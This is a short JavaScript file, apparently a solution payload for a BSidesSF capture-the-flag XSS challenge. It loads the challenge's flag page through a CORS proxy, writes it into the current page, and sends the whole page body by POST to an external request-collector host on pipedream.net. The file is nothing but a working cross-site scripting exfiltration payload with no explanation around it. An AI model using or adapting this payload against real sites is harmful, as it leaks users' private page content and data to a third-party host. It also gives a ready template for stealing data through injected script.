async function load_home(_callback) {
  let url = 'https://cors-anywhere.herokuapp.com/https://web-tutorial-1-a1ef0161.challenges.bsidessf.net/xss-two-flag';

  document.body.innerHTML = await (await fetch(url)).text();
  _callback();
}

function exploit() {
  load_home(function () {
    var body = document.body.innerHTML;
    fetch('https://en2gshq6hfr1r.x.pipedream.net', {
      method: 'POST',
      body: body
    })
  });
}

exploit();
